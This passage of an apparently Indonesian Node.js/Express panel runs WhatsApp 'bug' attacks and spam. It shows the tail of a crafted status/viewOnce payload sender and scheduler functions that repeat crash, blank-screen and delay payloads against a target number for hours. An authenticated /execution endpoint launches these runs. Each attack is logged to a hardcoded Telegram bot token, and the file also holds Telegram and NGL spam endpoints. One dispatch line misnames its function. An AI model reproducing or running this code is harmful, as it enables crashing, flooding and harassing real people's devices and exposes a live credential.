            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

// parameter sock ke SEMUA fungsi bug
async function delaylow(sock, durationHours, X) {
  console.log(`[INFO] delaylow started with socket:`, !!sock);
  
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 2;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 30) {
        console.log(`[BATCH ${batch}] Mengirim ${count + 1}/30...`);
        
        await Promise.all([
          audiodly(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Dark Knight 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function blankandro(sock, durationHours, X) {
  console.log(`[INFO] blankandro started with socket:`, !!sock);
  
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk blankandro');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 2;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 5) {
        console.log(`[BATCH ${batch}] Mengirim ${count + 1}/5...`);
        
        await Promise.all([
          SqlBlank(sock, X),
          N3xithBlank(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/5 BLANK UI🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Dark Knight 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function delayhigh(sock, durationHours, X) {
  console.log(`[INFO] delayhigh started with socket:`, !!sock);
  
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delayhigh');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 4;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 50) {
        console.log(`[BATCH ${batch}] Mengirim ${count + 1}/50...`);
        
        await Promise.all([
          audiodly(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/50 delayhigh 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3500);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Dark Knight 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function blankios(sock, durationHours, X) {
  console.log(`[INFO] blankios started with socket:`, !!sock);
  
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk blankios');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 2;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 2) {
        console.log(`[BATCH ${batch}] Mengirim ${count + 1}/10...`);
        
        await Promise.all([
          crashios(sock, X),
          crashios2(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 blankios 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3500);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Dark Knight 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function fcios(sock, durationHours, X) {
  console.log(`[INFO] fc-ios started with socket:`, !!sock);
  
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk fc-ios');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 5) {
        console.log(`[BATCH ${batch}] Mengirim ${count + 1}/40...`);
        
        await Promise.all([
          iosinvis(sock, X),
          sleep(500),
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/40 fc-ios 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 6000);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Dark Knight 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// Middleware untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  // Jika tidak ada session, redirect ke login
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  // Cek apakah user ada dan belum expired
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  // Jika semua pengecekan lolos, lanjut ke route
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "INDICTIVE", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/dashboard");
});

// Tambahkan auth middleware untuk WiFi Killer
app.get('/dashboard', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'INDICTIVE', 'dashboard.html'));
});

// Endpoint untuk mendapatkan data user dan session
app.get("/api/dashboard-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  // Tentukan role user
  let role = "User";
  const userId = req.cookies.sessionUser; // atau sesuai dengan cara Anda menyimpan ID user

  // Cek role berdasarkan fungsi yang sudah ada di index.js
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Moderator";
  } else if (isPT(userId)) {
    role = "PT";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized";
  }

  // Format expired time
  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  // Hitung waktu tersisa
  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: role,
    activeSenders: sessions.size, // Jumlah session WhatsApp aktif
    expired: expired,
    daysRemaining: daysRemaining
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "8218577733:AAGCZaBwKPkhHxR-chv0fwPklEszfRJAdE0";
const CHAT_ID = "7837260212";
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    console.log(`[INFO] Execution accessed by user: ${username}`);
    
    const filePath = "./INDICTIVE/Login.html";
    const html = await fs.promises.readFile(filePath, "utf8").catch(err => {
      return res.status(500).send("✗ Gagal baca file Login.html");
    });

    if (!username) {
      console.log(`[INFO] No username, redirecting to login`);
      return res.send(html);
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      console.log(`[INFO] User ${username} expired or not found`);
      return res.send(html);
    }

    // ✅ PERBAIKI: Validasi parameter dengan benar
    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target;
    const mode = req.query.mode;
    
    console.log(`[INFO] Query params - justExecuted: ${justExecuted}, target: ${targetNumber}, mode: ${mode}`);

    // 🔥 VALIDASI PARAMETER - TAMBAHKAN INI
    if (!targetNumber || targetNumber === 'undefined') {
      return res.send(executionPage("❌ Target Tidak Valid", {
        message: "Nomor target tidak valid atau kosong. Pastikan format: 628xxxxxxx",
        activeSenders: []
      }, false, currentUser, "Nomor target tidak valid", mode));
    }

    if (!mode || mode === 'undefined') {
      return res.send(executionPage("❌ Mode Tidak Dikenal", {
        target: targetNumber,
        message: "Mode bug tidak dipilih. Silakan pilih jenis bug terlebih dahulu.",
        activeSenders: []
      }, false, currentUser, "Mode tidak dikenal", mode));
    }

    // Validasi format nomor
    const cleanTarget = targetNumber.replace(/\D/g, '');
    if (!cleanTarget.startsWith('62') || cleanTarget.length < 10) {
      return res.send(executionPage("❌ Format Nomor Salah", {
        target: targetNumber,
        message: "Format nomor harus diawali dengan 62 dan minimal 10 digit",
        activeSenders: []
      }, false, currentUser, "Format nomor salah", mode));
    }

    if (justExecuted) {
      return res.send(executionPage("✓ S U C C E S", {
        target: cleanTarget,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed`
      }, false, currentUser, "", mode));
    }

    // ✅ CEK SESSION & SOCKET DETAIL
    console.log(`[INFO SESSION] Checking sessions for user: ${username}`);
    
    const userSessions = loadUserSessions();
    console.log(`[INFO SESSION] All user sessions:`, JSON.stringify(userSessions, null, 2));
    
    const userSenders = userSessions[username] || [];
    console.log(`[INFO SESSION] User ${username} senders:`, userSenders);
    
    const activeUserSenders = userSenders.filter(sender => {
      const hasSession = sessions.has(sender);
      console.log(`[INFO SESSION] Sender ${sender} has active session: ${hasSession}`);
      return hasSession;
    });
    
    console.log(`[INFO SESSION] Active user senders:`, activeUserSenders);

    if (activeUserSenders.length === 0) {
      console.log(`[INFO] No active senders found for user ${username}`);
      return res.send(executionPage("❌ Tidak Ada Sender Aktif", {
        message: "Anda tidak memiliki sender WhatsApp yang aktif. Silakan tambahkan sender terlebih dahulu di menu 'My Senders'."
      }, false, currentUser, "", mode));
    }

    // ✅ VALIDASI MODE BUG
    const validModes = ["delay", "blank", "medium", "blank-ios", "fcinvsios"];
    if (!validModes.includes(mode)) {
      console.log(`[INFO] Invalid mode: ${mode}`);
      return res.send(executionPage("❌ Mode Tidak Valid", {
        target: cleanTarget,
        message: `Mode '${mode}' tidak dikenali. Mode yang valid: ${validModes.join(', ')}`,
        activeSenders: activeUserSenders
      }, false, currentUser, "Mode tidak valid", mode));
    }

    try {
      // ✅ GUNAKAN SENDER PERTAMA YANG AKTIF
      const userSender = activeUserSenders[0];
      const sock = sessions.get(userSender);
      
      console.log(`[INFO SOCKET] Selected sender: ${userSender}`);
      console.log(`[INFO SOCKET] Socket object:`, sock ? 'EXISTS' : 'NULL');
      
      if (!sock) {
        console.error(`[ERROR] Socket is null for sender: ${userSender}`);
        throw new Error("Sender tidak aktif. Silakan periksa koneksi sender Anda.");
      }

      const target = `${cleanTarget}@s.whatsapp.net`;
      console.log(`[INFO EXECUTION] Starting bug execution:`, {
        user: username,
        sender: userSender,
        target: target,
        mode: mode,
        socketStatus: sock.connectionStatus || 'unknown'
      });

      // ✅ EKSEKUSI BUG DENGAN SOCKET USER
      console.log(`[INFO BUG] Executing bug mode: ${mode}`);
      
      let bugResult;
      if (mode === "delay") {
        bugResult = await delaylow(sock, 24, target);
      } else if (mode === "blank") {
        bugResult = await blankandro(sock, 24, target);
      } else if (mode === "medium") {
        bugResult = await delayhigh(sock, 24, target);
      } else if (mode === "blank-ios") {
        bugResult = await blankios(sock, 24, target);
      } else if (mode === "fcinvsios") {
        bugResult = await fc-ios(sock, 24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      console.log(`[INFO BUG] Bug execution completed, result:`, bugResult);

      // ✅ update global cooldown
      lastExecution = Date.now();

      // ✅ LOG LOKAL
      console.log(`[EXECUTION SUCCESS] User: ${username} | Sender: ${userSender} | Target: ${cleanTarget} | Mode: ${mode} | Time: ${new Date().toLocaleString("id-ID")}`);

      // ✅ KIRIM LOG KE TELEGRAM
      const logMessage = `<blockquote>⚡ <b>New Execution Success</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget}
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      // 🔥 REDIRECT DENGAN PARAMETER justExecuted=true
      console.log(`[INFO] Redirecting to success page`);
      return res.redirect(`/execution?justExecuted=true&target=${encodeURIComponent(cleanTarget)}&mode=${mode}`);
      
    } catch (err) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, err.message);
      console.error(`[EXECUTION ERROR] Stack:`, err.stack);
      
      return res.send(executionPage("✗ Gagal kirim", {
        target: cleanTarget,
        message: err.message || "Terjadi kesalahan saat pengiriman.",
        activeSenders: activeUserSenders
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// debug untuk cek socket apakah sender lu active apa engga 
app.get("/debug-sessions", (req, res) => {
  const userSessions = loadUserSessions();
  const activeSessions = Array.from(sessions.keys());
  
  // Cek file structure
  let fileDetails = {};
  for (const [username, numbers] of Object.entries(userSessions)) {
    fileDetails[username] = {};
    numbers.forEach(number => {
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      fileDetails[username][number] = {
        session_dir: sessionDir,
        dir_exists: fs.existsSync(sessionDir),
        creds_exists: fs.existsSync(credsPath),
        creds_size: fs.existsSync(credsPath) ? fs.statSync(credsPath).size : 0
      };
    });
  }
  
  res.json({
    timestamp: new Date().toISOString(),
    sessions_map_size: sessions.size,
    sessions_map_content: activeSessions,
    user_sessions_content: userSessions,
    file_structure: fileDetails,
    problem: sessions.size === 0 ? "❌ NO ACTIVE SESSIONS" : "✅ SESSIONS ACTIVE"
  });
});

// Route untuk serve HTML Telegram Spam
app.get('/telegram-spam', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'INDICTIVE', 'telegram-spam.html'));
});

// API endpoint untuk spam Telegram
app.post('/api/telegram-spam', async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        if (!username) {
            return res.json({ success: false, error: 'Unauthorized' });
        }

        const { token, chatId, count, delay, mode } = req.body;
        
        if (!token || !chatId || !count || !delay || !mode) {
            return res.json({ success: false, error: 'Missing parameters' });
        }

        // Validasi input
        if (count > 1000) {
            return res.json({ success: false, error: 'Maximum count is 1000' });
        }

        if (delay < 100) {
            return res.json({ success: false, error: 'Minimum delay is 100ms' });
        }

        // Protected targets - tidak boleh diserang
        const protectedTargets = ['@kyu_pedo', '7837260212'];
        if (protectedTargets.includes(chatId)) {
            return res.json({ success: false, error: 'Protected target cannot be attacked' });
        }

        // Kirim log ke Telegram owner
        const logMessage = `<blockquote>🔰 <b>New Telegram Spam Attack</b>
        
👤 User: ${username}
🎯 Target: ${chatId}
📱 Mode: ${mode.toUpperCase()}
🔢 Count: ${count}
⏰ Delay: ${delay}ms
🕐 Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: logMessage,
                parse_mode: "HTML"
            });
        } catch (err) {
            console.error("Gagal kirim log Telegram:", err.message);
        }

        // Return success untuk trigger frontend
        res.json({ 
            success: true, 
            message: 'Attack started successfully',
            attackId: Date.now().toString()
        });

    } catch (error) {
        console.error('Telegram spam error:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

// ============================================
const userTracking = {
  requests: new Map(), // Track per user
  targets: new Map(),  // Track per target
  
  // Reset otomatis tiap 24 jam
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },
  
  // Cek apakah user sudah melebihi limit harian
  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },
  
  // Cek apakah target sudah melebihi limit harian
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },
  
  // Update counter setelah berhasil kirim
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },
  
  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },
  
  // Lihat statistik user
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },
  
  // Lihat statistik target
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

// Auto-reset setiap 24 jam (midnight)
setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000); // Cek tiap 1 menit

// ============================================
// FUNGSI NGL SPAM - UPDATED
// ============================================
async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    // Enhanced form data dengan field tambahan
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateEnhancedUUID());
    formData.append('gameSlug', '');
